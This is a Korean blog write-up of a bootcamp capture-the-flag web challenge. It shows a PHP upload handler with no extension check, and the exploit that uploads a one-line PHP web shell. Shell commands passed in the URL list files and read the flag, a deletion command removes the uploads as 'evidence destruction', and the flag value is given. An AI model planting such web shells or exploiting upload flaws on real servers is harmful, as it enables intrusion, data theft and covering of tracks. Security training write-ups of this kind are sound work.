---
title: "[Writeup] Knockon Bootcamp - 9. File Uploaded"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - File Upload
  - Command Injection
last_modified_at: 2024-09-15T18:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10007/>

![9. File Uploaded 1](/assets/images/writeup/web-hacking/knock-on/9_FILE_1.png)

![9. File Uploaded 2](/assets/images/writeup/web-hacking/knock-on/9_FILE_2.png)

|

|

|

### 목표

---

서버 파일에서 flag 찾기

|

### 공격 기법

---

File Upload

Command Injection

|

|

|

## 문제 코드

### upload.php

---

```php
<?php
require ("db.php");
if ($_SERVER['REQUEST_METHOD'] == 'POST' and $_POST['title'] and $_POST['content']) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
        $uploadPath = './uploads/';
        $fileExtension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
        $fileName = uniqid("file_", true) . '.' . $fileExtension;

        if (!is_dir($uploadPath)) {
            mkdir($uploadPath, 0777, true);
        }
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath . $fileName)) {
            try {
                $title = $_POST['title'];
                $content = $_POST['content'];
                $stmt = $conn->prepare("INSERT INTO upload (title, content,filename) VALUES (?, ?, ?)");
                $stmt->bind_param('sss', $title, $content, $fileName);

                $stmt->execute();
            } catch (mysqli_sql_exception $e) {
                echo "Query failed: " . $e->getMessage();
            }
            echo "<script>alert('$fileName')</script>";
            echo "<script>location.href='/dashboard.php?title=$title'</script>";
        } else {
            echo "<script>alert('Something wrong..');</script>";
            echo "<script>location.href='/index.php'</script>";
        }
    }

} else {
    ?>
    <!DOCTYPE html>
    <html>

    <head>
        <title>Upload File</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    </head>

    <body class="bg-dark text-white">
        <div class="container mt-5">
            <div class="row">
                <div class="col-md-6 offset-md-3">
                    <div class="card card-body bg-secondary">
                        <h2 class="text-center">Upload</h2>
                        <form action="/upload.php" method="post" enctype="multipart/form-data">
                            <div class="form-group">
                                <label for="title">Title</label>
                                <input type="text" id="title" name="title" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="content">Details</label>
                                <textarea id="content" name="content" rows="4" class="form-control"></textarea>
                            </div>
                            <div class="form-group">
                                <label for="file">Attach Image</label>
                                <input type="file" id="file" name="file" class="form-control-file">
                            </div>
                            <div class="form-group">
                                <input type="submit" value="Upload" class="btn btn-primary">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    </body>

    </html>
    <?php

}
?>
```

파일 확장자에 대한 필터링이 없음

|

|

|

## Exploit

```php
<?php
	system($_GET['id'])
?>
```

웹 쉘이 담긴 `.php`파일을 준비

`id` 파라미터를 통해 서버에 `명령어`를 실행할 수 있음

|

![9. File Uploaded 3](/assets/images/writeup/web-hacking/knock-on/9_FILE_3.png)

웹 쉘 파일을 업로드하면 파일명이 나옴. 복붙

파일 경로로 들어가면 파일이 실행되어 파일에 담긴 웹 쉘 코드가 실행됨

|

```bash
http://war.knock-on.org:10007/uploads/file_66e0e6517b6e37.93809256.php?id=ls
```

![9. File Uploaded 4](/assets/images/writeup/web-hacking/knock-on/9_FILE_4.png)

`?id=ls` 방금 업로드한 파일이 나타남

`id`파라미터로 서버에 명령을 내릴 수 있게됨

|

```bash
?id=ls ..
```

![9. File Uploaded 5](/assets/images/writeup/web-hacking/knock-on/9_FILE_5.png)

상위 경로로 가면 `flag`파일이 있음

|

```bash
?id=cat ../flag
```

![9. File Uploaded 6](/assets/images/writeup/web-hacking/knock-on/9_FILE_6.png)

`cat`으로 `flag` 출력

|

```bash
?id=rm -r ../uploads/*
```

마무리로 증거인멸

|

|

|

## Payload

### test.php

---

```php
<?php
echo system($_GET['id'])
?>
```

|

### url

---

```python
http://war.knock-on.org:10007/uploads/file_66e0e33fa34cf4.08493015.php?id=cat ../flag
```

|

|

### FLAG

---

```bash
KO{upl04d_w1th0ut_ch3ck_1s_d4ng3r0us}
```

|

---